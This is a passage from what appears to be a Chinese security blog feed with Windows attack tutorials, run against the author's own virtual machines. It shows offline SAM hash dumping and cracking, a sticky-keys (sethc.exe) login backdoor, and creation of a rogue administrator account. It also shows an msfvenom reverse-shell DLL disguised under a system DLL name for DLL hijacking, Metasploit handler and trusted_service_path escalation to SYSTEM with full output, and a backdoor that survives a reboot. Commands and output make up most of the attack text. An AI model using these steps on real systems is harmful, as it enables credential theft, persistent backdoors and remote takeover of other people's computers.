<p>fdisk -l &amp;&amp; mount /dev/sda2 /mnt &amp;&amp; cd /mnt/ </p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419185436_ohOVSp_Screenshot.jpeg" alt=""></p>
<h4 id="4-挂载完之后我们先盗取账号密码【Win10果然更安全了，居然显示是空密码，这显然不是我们要的结果，第二张图附上Win7的效果图】"><a href="#4-挂载完之后我们先盗取账号密码【Win10果然更安全了，居然显示是空密码，这显然不是我们要的结果，第二张图附上Win7的效果图】" class="headerlink" title="4. 挂载完之后我们先盗取账号密码【Win10果然更安全了，居然显示是空密码，这显然不是我们要的结果，第二张图附上Win7的效果图】"></a>4. 挂载完之后我们先盗取账号密码【Win10果然更安全了，居然显示是空密码，这显然不是我们要的结果，第二张图附上Win7的效果图】</h4><blockquote>
<p>cd /mnt/Windows/System32/config/ &amp;&amp; samdump2 SYSTEM SAM</p>
<p>hashcat -m 1000 afc44ee7351d61d00698796da06b1ebf /usr/share/wordlists/sqlmap.txt <strong>-</strong>-force</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180420121521_8LVsuZ_Screenshot.jpeg" alt=""></p>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419190846_DSIMrd_Screenshot.jpeg" alt=""></p>
<h4 id="5-虽然win10密码安全性加强了，但并不阻碍我们进行别的操作，下面我们使用经典的shift提权技术来完成进一步操作，上一篇Windows-提权基础-讲漏了，这里补上"><a href="#5-虽然win10密码安全性加强了，但并不阻碍我们进行别的操作，下面我们使用经典的shift提权技术来完成进一步操作，上一篇Windows-提权基础-讲漏了，这里补上" class="headerlink" title="5. 虽然win10密码安全性加强了，但并不阻碍我们进行别的操作，下面我们使用经典的shift提权技术来完成进一步操作，上一篇Windows 提权基础 讲漏了，这里补上"></a>5. 虽然win10密码安全性加强了，但并不阻碍我们进行别的操作，下面我们使用经典的shift提权技术来完成进一步操作，上一篇<a href="https://times0ng.github.io/2018/04/13/Windows-提权基础（下）/">Windows 提权基础</a> 讲漏了，这里补上</h4><blockquote>
<p>cd /mnt/Windows/System32/</p>
<p>cp cmd.exe sethc.exe</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419192009_pBbNtJ_Screenshot.jpeg" alt=""></p>
<h4 id="6-OK-现在需要做的就是关闭kali-，将映射到win10的ISO移除，然后启动win10，可以看到登录界面，此时我们连续快速的多次按shift键就能弹出命令行"><a href="#6-OK-现在需要做的就是关闭kali-，将映射到win10的ISO移除，然后启动win10，可以看到登录界面，此时我们连续快速的多次按shift键就能弹出命令行" class="headerlink" title="6. OK 现在需要做的就是关闭kali ，将映射到win10的ISO移除，然后启动win10，可以看到登录界面，此时我们连续快速的多次按shift键就能弹出命令行"></a>6. OK 现在需要做的就是关闭kali ，将映射到win10的ISO移除，然后启动win10，可以看到登录界面，此时我们连续快速的多次按shift键就能弹出命令行</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419193253_crhGWM_Screenshot.jpeg" alt=""></p>
<h4 id="7-我们的权限这么大，想必添加个管理员账号什么的也不成问题，下面我添加个test管理员账号，然后登录，一进去就碰到win10给我各种Hi，看得我一脸懵逼"><a href="#7-我们的权限这么大，想必添加个管理员账号什么的也不成问题，下面我添加个test管理员账号，然后登录，一进去就碰到win10给我各种Hi，看得我一脸懵逼" class="headerlink" title="7. 我们的权限这么大，想必添加个管理员账号什么的也不成问题，下面我添加个test管理员账号，然后登录，一进去就碰到win10给我各种Hi，看得我一脸懵逼"></a>7. 我们的权限这么大，想必添加个管理员账号什么的也不成问题，下面我添加个test管理员账号，然后登录，一进去就碰到win10给我各种Hi，看得我一脸懵逼</h4><blockquote>
<p>net user test test /add</p>
<p>net localgroup administrators /add test</p>
<p>logoff</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419195550_4l4ZGP_Screenshot.jpeg" alt=""></p>
<h4 id="8-刚才我们没能抓到win10的hash，但是如果我们仍然想登录times0ng账号的话可以先用命令行修改密码，然后再登陆。【很尴尬，自己的ID都敲错了】"><a href="#8-刚才我们没能抓到win10的hash，但是如果我们仍然想登录times0ng账号的话可以先用命令行修改密码，然后再登陆。【很尴尬，自己的ID都敲错了】" class="headerlink" title="8. 刚才我们没能抓到win10的hash，但是如果我们仍然想登录times0ng账号的话可以先用命令行修改密码，然后再登陆。【很尴尬，自己的ID都敲错了】"></a>8. 刚才我们没能抓到win10的hash，但是如果我们仍然想登录times0ng账号的话可以先用命令行修改密码，然后再登陆。【很尴尬，自己的ID都敲错了】</h4><blockquote>
<p>net user time0sng toor</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419200844_4N3J4b_Screenshot.jpeg" alt=""></p>
<h2 id="0x06-结语"><a href="#0x06-结语" class="headerlink" title="0x06. 结语"></a>0x06. 结语</h2><h4 id="希望大家喜欢我自制的Windows系列教程，后续我将给大家带来更多更有趣的技巧！如果对上述操作步骤不是很懂或者想看一下视屏演示的读者，可以观看我自制的视屏教程，一元观看就当对笔者劳动的支持吧！大家在信安之路公众号后台回复本视频编号：-001-即可获取百度云链接和解压密码。"><a href="#希望大家喜欢我自制的Windows系列教程，后续我将给大家带来更多更有趣的技巧！如果对上述操作步骤不是很懂或者想看一下视屏演示的读者，可以观看我自制的视屏教程，一元观看就当对笔者劳动的支持吧！大家在信安之路公众号后台回复本视频编号：-001-即可获取百度云链接和解压密码。" class="headerlink" title="希望大家喜欢我自制的Windows系列教程，后续我将给大家带来更多更有趣的技巧！如果对上述操作步骤不是很懂或者想看一下视屏演示的读者，可以观看我自制的视屏教程，一元观看就当对笔者劳动的支持吧！大家在信安之路公众号后台回复本视频编号： 001 即可获取百度云链接和解压密码。"></a>希望大家喜欢我自制的Windows系列教程，后续我将给大家带来更多更有趣的技巧！如果对上述操作步骤不是很懂或者想看一下视屏演示的读者，可以观看我自制的视屏教程，一元观看就当对笔者劳动的支持吧！大家在信安之路公众号后台回复本视频编号： 001 即可获取百度云链接和解压密码。</h4>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00. 前言&quot;&gt;&lt;/a&gt;0x00. 前言&lt;/h2&gt;&lt;h4 id=&quot;渗透测试过程中我们经常需要获取管理员的账号密码，以便进行更进一步的操作，下面我将给大家总结几种steal-account的手法！其中可能也会涉及到apt的内容，希望大家喜欢。&quot;&gt;&lt;a href=&quot;#渗透测试过程中我们经常需要获取管理员的账号密码，以便进行更进一步的操作，下面我将给大家总结几种steal-account的手法！其中可能也会涉及到apt的内容，希望大家喜欢。&quot; class=&quot;headerlink&quot; title=&quot;渗透测试过程中我们经常需要获取管理员的账号密码，以便进行更进一步的操作，下面我将给大家总结几种steal account的手法！其中可能也会涉及到apt的内容，希望大家喜欢。&quot;&gt;&lt;/a&gt;渗透测试过程中我们经常需要获取管理员的账号密码，以便进行更进一步的操作，下面我将给大家总结几种steal account的手法！其中可能也会涉及到apt的内容，希望大家喜欢。&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Windows 提权基础（下）</title>
    <link href="http://TimeS0ng.github.io/2018/04/13/Windows-%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
    <id>http://TimeS0ng.github.io/2018/04/13/Windows-提权基础（下）/</id>
    <published>2018-04-13T09:13:28.000Z</published>
    <updated>2018-04-13T09:13:59.989Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00. 序言"></a>0x00. 序言</h2><h4 id="今天给大家讲一讲我自己的骚姿势，虽然技术内容都不是我自己发明的，但是我将几种技术杂糅在一起之后居然产生了让我自己都感到惊讶的效果！！"><a href="#今天给大家讲一讲我自己的骚姿势，虽然技术内容都不是我自己发明的，但是我将几种技术杂糅在一起之后居然产生了让我自己都感到惊讶的效果！！" class="headerlink" title="今天给大家讲一讲我自己的骚姿势，虽然技术内容都不是我自己发明的，但是我将几种技术杂糅在一起之后居然产生了让我自己都感到惊讶的效果！！"></a>今天给大家讲一讲我自己的骚姿势，虽然技术内容都不是我自己发明的，但是我将几种技术杂糅在一起之后居然产生了让我自己都感到惊讶的效果！！</h4><a id="more"></a>
<h2 id="0x01-DLL-劫持原理"><a href="#0x01-DLL-劫持原理" class="headerlink" title="0x01. DLL 劫持原理"></a>0x01. DLL 劫持原理</h2><h4 id="原理：程序通常不能靠自己自动运行，它们往往需要调用许多资源（主要是DLL-文件，Windows-中的动态链接库）。如果程序或者服务从一个我们拥有写权限的目录里加载文件时，我们就能够利用这一点来弹shell，当然这个shell-的权限也就是该程序所拥有的权限。"><a href="#原理：程序通常不能靠自己自动运行，它们往往需要调用许多资源（主要是DLL-文件，Windows-中的动态链接库）。如果程序或者服务从一个我们拥有写权限的目录里加载文件时，我们就能够利用这一点来弹shell，当然这个shell-的权限也就是该程序所拥有的权限。" class="headerlink" title="原理：程序通常不能靠自己自动运行，它们往往需要调用许多资源（主要是DLL 文件，Windows 中的动态链接库）。如果程序或者服务从一个我们拥有写权限的目录里加载文件时，我们就能够利用这一点来弹shell，当然这个shell 的权限也就是该程序所拥有的权限。"></a>原理：程序通常不能靠自己自动运行，它们往往需要调用许多资源（主要是DLL 文件，Windows 中的动态链接库）。如果程序或者服务从一个我们拥有写权限的目录里加载文件时，我们就能够利用这一点来弹shell，当然这个shell 的权限也就是该程序所拥有的权限。</h4><h4 id="原理：通常来说Windows-程序会使用一个预定义搜索路径去寻找DLL-文件，并且会按照特定的顺序来检索这些路径。当将恶意的DLL-文件放到其中一个路径下，并保证该恶意DLL-先于合法的DLL-被程序找到时就会发生DLL-劫持；也可能是程序寻找的DLL-文件名在系统中并不存在，这时我们只需将自己定制的DLL-文件放到程序的搜索路径也可以达到目的"><a href="#原理：通常来说Windows-程序会使用一个预定义搜索路径去寻找DLL-文件，并且会按照特定的顺序来检索这些路径。当将恶意的DLL-文件放到其中一个路径下，并保证该恶意DLL-先于合法的DLL-被程序找到时就会发生DLL-劫持；也可能是程序寻找的DLL-文件名在系统中并不存在，这时我们只需将自己定制的DLL-文件放到程序的搜索路径也可以达到目的" class="headerlink" title="原理：通常来说Windows 程序会使用一个预定义搜索路径去寻找DLL 文件，并且会按照特定的顺序来检索这些路径。当将恶意的DLL 文件放到其中一个路径下，并保证该恶意DLL 先于合法的DLL 被程序找到时就会发生DLL 劫持；也可能是程序寻找的DLL 文件名在系统中并不存在，这时我们只需将自己定制的DLL 文件放到程序的搜索路径也可以达到目的"></a>原理：通常来说Windows 程序会使用一个预定义搜索路径去寻找DLL 文件，并且会按照特定的顺序来检索这些路径。当将恶意的DLL 文件放到其中一个路径下，并保证该恶意DLL 先于合法的DLL 被程序找到时就会发生DLL 劫持；也可能是程序寻找的DLL 文件名在系统中并不存在，这时我们只需将自己定制的DLL 文件放到程序的搜索路径也可以达到目的</h4><h4 id="下面你可以看到在一个32-位系统中DLL-的搜索顺序："><a href="#下面你可以看到在一个32-位系统中DLL-的搜索顺序：" class="headerlink" title="下面你可以看到在一个32 位系统中DLL 的搜索顺序："></a>下面你可以看到在一个32 位系统中DLL 的搜索顺序：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">1 - The directory from which the application loaded</div><div class="line">2 - 32-bit System directory (C:\Windows\System32)</div><div class="line">3 - 16-bit System directory (C:\Windows\System)</div><div class="line">4 - Windows directory (C:\Windows)</div><div class="line">5 - The current working directory (CWD)</div><div class="line">6 - Directories in the PATH environment variable (system then user)</div></pre></td></tr></table></figure>
<h4 id="通过上面的搜索路径可以看到第六点环境变量，这也是我们比较容易控制的路径，如果目标装有python，那么Path-C-Python27-就是我们可以控制的路径，我们只需要将恶意定制的DLL-文件放到这个目录就可以。"><a href="#通过上面的搜索路径可以看到第六点环境变量，这也是我们比较容易控制的路径，如果目标装有python，那么Path-C-Python27-就是我们可以控制的路径，我们只需要将恶意定制的DLL-文件放到这个目录就可以。" class="headerlink" title="通过上面的搜索路径可以看到第六点环境变量，这也是我们比较容易控制的路径，如果目标装有python，那么Path = C:\Python27 就是我们可以控制的路径，我们只需要将恶意定制的DLL 文件放到这个目录就可以。"></a>通过上面的搜索路径可以看到第六点环境变量，这也是我们比较容易控制的路径，如果目标装有python，那么Path = C:\Python27 就是我们可以控制的路径，我们只需要将恶意定制的DLL 文件放到这个目录就可以。</h4><h2 id="0x02-实战演示"><a href="#0x02-实战演示" class="headerlink" title="0x02. 实战演示"></a>0x02. 实战演示</h2><h4 id="1-首先我在知乎上随便搜了点关于Windows-中的软件，然后随便选了一个感觉可能存在DLL-劫持的软件安装到我的Windows-7-虚拟机中"><a href="#1-首先我在知乎上随便搜了点关于Windows-中的软件，然后随便选了一个感觉可能存在DLL-劫持的软件安装到我的Windows-7-虚拟机中" class="headerlink" title="1. 首先我在知乎上随便搜了点关于Windows 中的软件，然后随便选了一个感觉可能存在DLL 劫持的软件安装到我的Windows 7 虚拟机中"></a>1. 首先我在知乎上随便搜了点关于Windows 中的软件，然后随便选了一个感觉可能存在DLL 劫持的软件安装到我的Windows 7 虚拟机中</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180410222237_MewziO_Screenshot.jpeg" alt=""></p>
<h4 id="2-然后调用工具-DllHijackAuditor-自动检测我们刚才下载的软件是否存在DLL-劫持，根据下图可以看到这里面存在一共-5-个DLL-文件可供我们恶意劫持，这是我没想到的，我确实是在网上随便搜了一个软件而已，没想到居然会这么不经摧折！"><a href="#2-然后调用工具-DllHijackAuditor-自动检测我们刚才下载的软件是否存在DLL-劫持，根据下图可以看到这里面存在一共-5-个DLL-文件可供我们恶意劫持，这是我没想到的，我确实是在网上随便搜了一个软件而已，没想到居然会这么不经摧折！" class="headerlink" title="2. 然后调用工具 DllHijackAuditor 自动检测我们刚才下载的软件是否存在DLL 劫持，根据下图可以看到这里面存在一共 5 个DLL  文件可供我们恶意劫持，这是我没想到的，我确实是在网上随便搜了一个软件而已，没想到居然会这么不经摧折！"></a>2. 然后调用工具 <a href="https://securityxploded.com/getsoftware_direct.php?id=7777" target="_blank" rel="external">DllHijackAuditor</a> 自动检测我们刚才下载的软件是否存在DLL 劫持，根据下图可以看到这里面存在一共 5 个DLL  文件可供我们恶意劫持，这是我没想到的，我确实是在网上随便搜了一个软件而已，没想到居然会这么不经摧折！</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180410223301_Bp44of_Screenshot.jpeg" alt=""></p>
<h4 id="3-接下来我们利用msfvenom-生成文件名为ext-ms-win-kernel32-package-current-l1-1-0-dll-的-DLL-木马，用于进行DLL-劫持。"><a href="#3-接下来我们利用msfvenom-生成文件名为ext-ms-win-kernel32-package-current-l1-1-0-dll-的-DLL-木马，用于进行DLL-劫持。" class="headerlink" title="3. 接下来我们利用msfvenom 生成文件名为ext-ms-win-kernel32-package-current-l1-1-0.dll 的 DLL 木马，用于进行DLL 劫持。"></a>3. 接下来我们利用msfvenom 生成文件名为ext-ms-win-kernel32-package-current-l1-1-0.dll 的 DLL 木马，用于进行DLL 劫持。</h4><blockquote>
<p>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.175.143 lport=4444 -f dll -o /root/ext-ms-win-kernel32-package-current-l1-1-0.dll</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180410224504_LFKxXq_Screenshot.jpeg" alt=""></p>
<h4 id="4-查看Windows-的环境变量，并将DLL-木马文件放入可控的环境变量中-这样当我们启动CCleaner-软件的时候就会调用我们的DLL-木马文件反弹shell"><a href="#4-查看Windows-的环境变量，并将DLL-木马文件放入可控的环境变量中-这样当我们启动CCleaner-软件的时候就会调用我们的DLL-木马文件反弹shell" class="headerlink" title="4. 查看Windows 的环境变量，并将DLL 木马文件放入可控的环境变量中,这样当我们启动CCleaner 软件的时候就会调用我们的DLL 木马文件反弹shell"></a>4. 查看Windows 的环境变量，并将DLL 木马文件放入可控的环境变量中,这样当我们启动CCleaner 软件的时候就会调用我们的DLL 木马文件反弹shell</h4><blockquote>
<p>echo %path% </p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180410224735_dwsj0R_Screenshot.jpeg" alt=""></p>
<h4 id="5-启动msf-的监听模式，默默等待用户执行软件，可以看到我们现在只是普通管理员权限"><a href="#5-启动msf-的监听模式，默默等待用户执行软件，可以看到我们现在只是普通管理员权限" class="headerlink" title="5. 启动msf 的监听模式，默默等待用户执行软件，可以看到我们现在只是普通管理员权限"></a>5. 启动msf 的监听模式，默默等待用户执行软件，可以看到我们现在只是普通管理员权限</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/multi/handler </div><div class="line">msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</div><div class="line">payload =&gt; windows/meterpreter/reverse_tcp</div><div class="line">msf exploit(multi/handler) &gt; set lhost 192.168.175.143</div><div class="line">lhost =&gt; 192.168.175.143</div><div class="line">msf exploit(multi/handler) &gt; set lport 4444</div><div class="line">lport =&gt; 4444</div><div class="line">msf exploit(multi/handler) &gt; run</div><div class="line"></div><div class="line">[*] Started reverse TCP handler on 192.168.175.143:4444</div></pre></td></tr></table></figure>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180410225355_mtdLaD_Screenshot.jpeg" alt=""></p>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180410225440_7mMEIN_Screenshot.jpeg" alt=""></p>
<h4 id="6-从meterpreter-进入shell-模式，然后我们手动构建一个存在漏洞的服务，以便后续进行提权到-SYSTEM"><a href="#6-从meterpreter-进入shell-模式，然后我们手动构建一个存在漏洞的服务，以便后续进行提权到-SYSTEM" class="headerlink" title="6. 从meterpreter 进入shell 模式，然后我们手动构建一个存在漏洞的服务，以便后续进行提权到 SYSTEM"></a>6. 从meterpreter 进入shell 模式，然后我们手动构建一个存在漏洞的服务，以便后续进行提权到 SYSTEM</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">sc create &quot;times0ng test&quot; binPath= &quot;C:\Program Files (x86)\times0ng test\just test\evil.exe&quot; start= auto</div><div class="line"></div><div class="line">cd C:\Program Files (x86)</div><div class="line"></div><div class="line">mkdir &quot;times0ng test\just test&quot;</div><div class="line"></div><div class="line">icacls &quot;C:\Program Files (x86)\times0ng test&quot; /grant Everyone:(OI)(CI)F /T</div></pre></td></tr></table></figure>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180410230219_rieB2E_Screenshot.jpeg" alt=""></p>
<h4 id="7-调用msf-的提权模块进行提权，可以看到我们很容易就取得了SYSTEM-权限"><a href="#7-调用msf-的提权模块进行提权，可以看到我们很容易就取得了SYSTEM-权限" class="headerlink" title="7. 调用msf 的提权模块进行提权，可以看到我们很容易就取得了SYSTEM 权限"></a>7. 调用msf 的提权模块进行提权，可以看到我们很容易就取得了SYSTEM 权限</h4><blockquote>
<p>use exploit/windows/local/trusted_service_path</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">C:\Program Files (x86)&gt;exit</div><div class="line">exit</div><div class="line">meterpreter &gt; </div><div class="line">meterpreter &gt; background </div><div class="line">[*] Backgrounding session 8...</div><div class="line">msf exploit(multi/handler) &gt; use exploit/windows/local/trusted_service_path</div><div class="line">msf exploit(windows/local/trusted_service_path) &gt; set session 8</div><div class="line">session =&gt; 8</div><div class="line">msf exploit(windows/local/trusted_service_path) &gt; set payload windows/meterpreter/reverse_tcp</div><div class="line">payload =&gt; windows/meterpreter/reverse_tcp</div><div class="line">msf exploit(windows/local/trusted_service_path) &gt; set lhost 192.168.175.143</div><div class="line">lhost =&gt; 192.168.175.143</div><div class="line">msf exploit(windows/local/trusted_service_path) &gt; set lport 4444</div><div class="line">lport =&gt; 4444</div><div class="line">msf exploit(windows/local/trusted_service_path) &gt; run</div><div class="line"></div><div class="line">[*] Started reverse TCP handler on 192.168.175.143:4444 </div><div class="line">[*] Finding a vulnerable service...</div><div class="line">[*] Placing C:\Program.exe for times0ng test</div><div class="line">[*] Writing 15872 bytes to C:\Program.exe...</div><div class="line">[*] Launching service times0ng test...</div><div class="line">[*] Sending stage (179779 bytes) to 192.168.175.145</div><div class="line">[*] Meterpreter session 9 opened (192.168.175.143:4444 -&gt; 192.168.175.145:49286) at 2018-04-10 11:05:23 -0400</div><div class="line">[!] This exploit may require manual cleanup of &apos;C:\Program.exe&apos; on the target</div><div class="line"></div><div class="line">meterpreter &gt; getuid</div><div class="line">Server username: NT AUTHORITY\SYSTEM</div><div class="line">meterpreter &gt;</div></pre></td></tr></table></figure>
<h4 id="8-重启win-7-，我们的DLL-木马仍然静静地躺在那里充当着忠实可靠的后门，一旦用户执行CCleaner-就会触发木马（想象一下如果把CCleaner-换成系统服务，还是开机自动启动项，那么一旦用户重启计算机就会触发后门反弹给我们-SYSTEM-shell）"><a href="#8-重启win-7-，我们的DLL-木马仍然静静地躺在那里充当着忠实可靠的后门，一旦用户执行CCleaner-就会触发木马（想象一下如果把CCleaner-换成系统服务，还是开机自动启动项，那么一旦用户重启计算机就会触发后门反弹给我们-SYSTEM-shell）" class="headerlink" title="8. 重启win 7 ，我们的DLL 木马仍然静静地躺在那里充当着忠实可靠的后门，一旦用户执行CCleaner 就会触发木马（想象一下如果把CCleaner 换成系统服务，还是开机自动启动项，那么一旦用户重启计算机就会触发后门反弹给我们 SYSTEM shell）"></a>8. 重启win 7 ，我们的DLL 木马仍然静静地躺在那里充当着忠实可靠的后门，一旦用户执行CCleaner 就会触发木马（想象一下如果把CCleaner 换成系统服务，还是开机自动启动项，那么一旦用户重启计算机就会触发后门反弹给我们 SYSTEM shell）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; reboot</div><div class="line">Rebooting...</div><div class="line">meterpreter &gt; [*] 192.168.175.145 - Meterpreter session 8 closed.  Reason: Died</div><div class="line"></div><div class="line">meterpreter &gt; </div><div class="line">[*] 192.168.175.145 - Meterpreter session 9 closed.  Reason: Died</div><div class="line"></div><div class="line">msf exploit(windows/local/trusted_service_path) &gt; use exploit/multi/handler </div><div class="line">msf exploit(multi/handler) &gt; run</div><div class="line"></div><div class="line">[*] Started reverse TCP handler on 192.168.175.143:4444 </div><div class="line">[*] Sending stage (179779 bytes) to 192.168.175.145</div><div class="line">[*] Meterpreter session 10 opened (192.168.175.143:4444 -&gt; 192.168.175.145:49160) at 2018-04-10 11:12:24 -0400</div><div class="line"></div><div class="line">meterpreter &gt; getuid</div><div class="line">Server username: WIN-CKN6B7H8THF\times0ng</div><div class="line">meterpreter &gt;</div></pre></td></tr></table></figure>
<h2 id="0x03-结语"><a href="#0x03-结语" class="headerlink" title="0x03. 结语"></a>0x03. 结语</h2><h4 id="希望大家能够喜欢，有更好的想法欢迎留言，或者进群交流！"><a href="#希望大家能够喜欢，有更好的想法欢迎留言，或者进群交流！" class="headerlink" title="希望大家能够喜欢，有更好的想法欢迎留言，或者进群交流！"></a>希望大家能够喜欢，有更好的想法欢迎留言，或者进群交流！</h4>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-序言&quot;&gt;&lt;a href=&quot;#0x00-序言&quot; class=&quot;headerlink&quot; title=&quot;0x00. 序言&quot;&gt;&lt;/a&gt;0x00. 序言&lt;/h2&gt;&lt;h4 id=&quot;今天给大家讲一讲我自己的骚姿势，虽然技术内容都不是我自己发明的，但是我将几种技术杂糅在一起之后居然产生了让我自己都感到惊讶的效果！！&quot;&gt;&lt;a href=&quot;#今天给大家讲一讲我自己的骚姿势，虽然技术内容都不是我自己发明的，但是我将几种技术杂糅在一起之后居然产生了让我自己都感到惊讶的效果！！&quot; class=&quot;headerlink&quot; title=&quot;今天给大家讲一讲我自己的骚姿势，虽然技术内容都不是我自己发明的，但是我将几种技术杂糅在一起之后居然产生了让我自己都感到惊讶的效果！！&quot;&gt;&lt;/a&gt;今天给大家讲一讲我自己的骚姿势，虽然技术内容都不是我自己发明的，但是我将几种技术杂糅在一起之后居然产生了让我自己都感到惊讶的效果！！&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Windows 提权基础（上）</title>
    <link href="http://TimeS0ng.github.io/2018/04/13/Windows-%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
    <id>http://TimeS0ng.github.io/2018/04/13/Windows-提权基础（上）/</id>
    <published>2018-04-13T09:13:10.000Z</published>
    <updated>2018-04-13T09:14:31.374Z</updated>
    
    <content type="html"><![CDATA[<h2 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h2><h4 id="本篇教程是笔者翻译国外大牛fuzzysecurity-的文章再加上个人的理解写出的关于Windows-提权基础的文章，其中有些地方因为不太实用所以做了适当修改，感谢-hl0rey-的帮助和建议。"><a href="#本篇教程是笔者翻译国外大牛fuzzysecurity-的文章再加上个人的理解写出的关于Windows-提权基础的文章，其中有些地方因为不太实用所以做了适当修改，感谢-hl0rey-的帮助和建议。" class="headerlink" title="本篇教程是笔者翻译国外大牛fuzzysecurity 的文章再加上个人的理解写出的关于Windows 提权基础的文章，其中有些地方因为不太实用所以做了适当修改，感谢@hl0rey 的帮助和建议。"></a>本篇教程是笔者翻译国外<a href="http://www.fuzzysecurity.com/tutorials/16.html" target="_blank" rel="external">大牛fuzzysecurity 的文章</a>再加上个人的理解写出的关于Windows 提权基础的文章，其中有些地方因为不太实用所以做了适当修改，感谢@hl0rey 的帮助和建议。</h4><a id="more"></a>
<h4 id="Indispensable-Resources"><a href="#Indispensable-Resources" class="headerlink" title="Indispensable Resources:"></a>Indispensable Resources:</h4><ul>
<li>Encyclopaedia Of Windows Privilege Escalation (Brett Moore) -<a href="https://www.youtube.com/watch?v=kMG8IsCohHA" target="_blank" rel="external">here</a></li>
<li>Windows Attacks: AT is the new black (Chris Gates &amp; Rob Fuller) -<a href="https://www.youtube.com/watch?v=_8xJaaQlpBo" target="_blank" rel="external">here</a></li>
<li>Elevating privileges by exploiting weak folder permissions (Parvez Anwar) -<a href="http://www.greyhathacker.net/?p=738" target="_blank" rel="external">here</a></li>
</ul>
<h2 id="Δt-for-t0-to-t3-Initial-Information-Gathering"><a href="#Δt-for-t0-to-t3-Initial-Information-Gathering" class="headerlink" title="Δt for t0 to t3 - Initial Information Gathering"></a>Δt for t0 to t3 - Initial Information Gathering</h2><h4 id="这个教程从Windows-的低权限shell-开始讲述如何提权。我们可能利用某个EXP-或者从客户端攻击取得了一个反弹shell-。最开始我们还不了解这台计算机，不知道它是干什么用的，连接到哪里，有什么等级的权限或者甚至不知道它是什么操作系统。"><a href="#这个教程从Windows-的低权限shell-开始讲述如何提权。我们可能利用某个EXP-或者从客户端攻击取得了一个反弹shell-。最开始我们还不了解这台计算机，不知道它是干什么用的，连接到哪里，有什么等级的权限或者甚至不知道它是什么操作系统。" class="headerlink" title="这个教程从Windows 的低权限shell 开始讲述如何提权。我们可能利用某个EXP 或者从客户端攻击取得了一个反弹shell 。最开始我们还不了解这台计算机，不知道它是干什么用的，连接到哪里，有什么等级的权限或者甚至不知道它是什么操作系统。"></a>这个教程从Windows 的低权限shell 开始讲述如何提权。我们可能利用某个EXP 或者从客户端攻击取得了一个反弹shell 。最开始我们还不了解这台计算机，不知道它是干什么用的，连接到哪里，有什么等级的权限或者甚至不知道它是什么操作系统。</h4><h4 id="最初我们希望快速的收集一些重要的信息，以便我们能够评估我们所处的状况，并作出正确的判断！"><a href="#最初我们希望快速的收集一些重要的信息，以便我们能够评估我们所处的状况，并作出正确的判断！" class="headerlink" title="最初我们希望快速的收集一些重要的信息，以便我们能够评估我们所处的状况，并作出正确的判断！"></a>最初我们希望快速的收集一些重要的信息，以便我们能够评估我们所处的状况，并作出正确的判断！</h4><h4 id="首先查看连接的是什么操作系统："><a 